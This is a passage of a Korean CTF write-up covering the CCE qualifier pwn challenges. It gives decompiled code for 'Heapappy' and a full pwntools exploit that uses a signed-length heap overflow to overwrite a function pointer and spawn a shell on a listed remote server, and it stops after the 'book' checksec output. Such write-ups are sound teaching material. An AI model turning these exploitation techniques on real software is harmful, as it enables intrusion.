![[Pasted image 20250817185028.png]]

예선 1등으로 본선에 간다. 청소년부에 폰은 총 6문제 출제되었다. (Heapappy : 250, book : 487, Artisan : 86, Chain : 962, Time Capsule : 962, MyBlog : 1000(0 Solve)) 대회 진행 중 마지막 문제를 제외한 5문제를 풀었다. MyBlog도 조금만 집중하면 풀 수 있었을 거 같은데 커널 문제를 풀 때 조건을 제대로 확인하지 않아서 두 시간을 날리기도 했고, 우리 팀 리버서도 나를 도와줄 정신 상태가 아니어서 깔끔하게 접고 쉬었다. 각설하고 풀이를 적어보겠다.

---
## 목차

1. Heapappy
2. book
3. Artisan
4. Chain
5. Time Capsule

---

# Heapappy

```bash
[*] '/mnt/d/cce/qual/Heapappy/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE가 꺼져 있고 Partial RELRO이다.

```C
unsigned __int64 prompt()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-40h]
  char nptr[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0LL;
  printf("Choice: ");
  while ( v1 <= 0x1E && fread(&nptr[v1], 1uLL, 1uLL, stdin) == 1 )
  {
    if ( nptr[v1] == 10 )
    {
      nptr[v1] = 0;
      break;
    }
    ++v1;
  }
  nptr[v1] = 0;
  return strtoul(nptr, 0LL, 10);
}

unsigned __int64 __fastcall input(__int64 a1, unsigned __int64 a2)
{
  char ptr; // [rsp+17h] [rbp-19h] BYREF
  unsigned __int64 i; // [rsp+18h] [rbp-18h]
  size_t v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0LL; ; ++i )
  {
    if ( i >= a2 )
      return i;
    v5 = fread(&ptr, 1uLL, 1uLL, stdin);
    if ( v5 != 1 )
      break;
    if ( ptr == 10 )
      return i;
    *(_BYTE *)(i + a1) = ptr;
  }
  if ( feof(stdin) )
    fwrite("ERROR: Reached EOF\n", 1uLL, 0x13uLL, stderr);
  else
    fwrite("ERROR: fread failed\n", 1uLL, 0x14uLL, stderr);
  return i;
}

int adopt()
{
  __int64 v1; // [rsp+0h] [rbp-10h]

  if ( pet )
    return puts("Already adopted.");
  pet = malloc(0x28uLL);
  if ( !pet )
    exit(1);
  memset(pet, 0, 0x28uLL);
  *((_DWORD *)pet + 6) = 0;
  *((_QWORD *)pet + 4) = act_tutorial;
  printf("Name length: ");
  v1 = prompt();
  if ( v1 > 24 )
    return puts("Name too long.");
  printf("Name bytes: ");
  input((__int64)pet, v1);
  return puts("Adopted.");
}
```

`adopt` 함수에서 이름의 길이 변수인 `v1`이 `signed __int64` 임을 알 수 있다. 따라서 음수를 입력하면 조건문을 통과한다. 그런데 `input` 함수에서는 `rsi`를 `unsigned __int64`로 해석하고 있으므로 `heap overflow`가 발생한다.

```C
int perform_ritual()
{
  if ( pet )
    return (*((__int64 (__fastcall **)(void *))pet + 4))(pet);
  else
    return puts("Adopt first.");
}
```

`perform_ritual` 함수에서 `heap`에 있는 함수 포인터를 참조하여 실행하는 부분이 있으므로 이를 `win` 함수로 덮어 쉘을 딴다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x000000000001568)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("3.38.164.12", 3030)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))

p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Choice: ', b'-1')
p.sendlineafter(b': ', b'a' * 0x20 + p64(0x40184d))
p.sendlineafter(b'Choice: ', b'3')

p.interactive()
```

---
# book

```C
[*] '/mnt/d/cce/qual/book/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

